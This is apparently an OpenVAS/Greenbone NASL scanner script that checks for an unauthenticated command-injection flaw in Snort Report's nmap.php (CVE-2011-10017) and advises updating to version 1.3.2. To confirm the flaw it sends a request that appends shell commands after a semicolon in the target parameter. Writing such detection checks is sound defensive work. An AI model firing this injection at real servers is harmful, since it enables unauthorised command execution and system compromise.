# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-onl

CPE = "cpe:/a:symmetrix:snort_report";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100781");
  script_version("2025-09-11T05:38:37+0000");
  script_tag(name:"last_modification", value:"2025-09-11 05:38:37 +0000 (Thu, 11 Sep 2025)");
  script_tag(name:"creation_date", value:"2010-09-03 15:15:12 +0200 (Fri, 03 Sep 2010)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2011-10017");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Snort Report < 1.3.2 nmap.php target Parameter Arbitrary Command Execution Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_snortreport_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("snortreport/http/detected");

  script_tag(name:"summary", value:"Snort Report is prone to a vulnerability that lets attackers
  execute arbitrary code.");

  script_tag(name:"insight", value:"Snort Report contains a remote command execution vulnerability
  in the nmap.php and nbtscan.php scripts. These scripts fail to properly sanitize user input
  passed via the target GET parameter, allowing attackers to inject arbitrary shell commands.
  Exploitation requires no authentication and can result in full compromise of the underlying
  system.");

  script_tag(name:"affected", value:"Snort Report version prior to 1.3.2.");

  script_tag(name:"solution", value:"Update to version 1.3.2 or later.");

  script_xref(name:"URL", value:"https://www.vulncheck.com/advisories/snort-report-rce");
  script_xref(name:"URL", value:"https://web.archive.org/web/20111003093911/http://www.symmetrixtech.com/articles/news-016.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

cmds = exploit_commands();

foreach pattern (keys(cmds)) {
  cmd = cmds[pattern];

  url = dir + "/nmap.php?target=;" + cmd;

  if (http_vuln_check(port: port, url: url, pattern: pattern)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
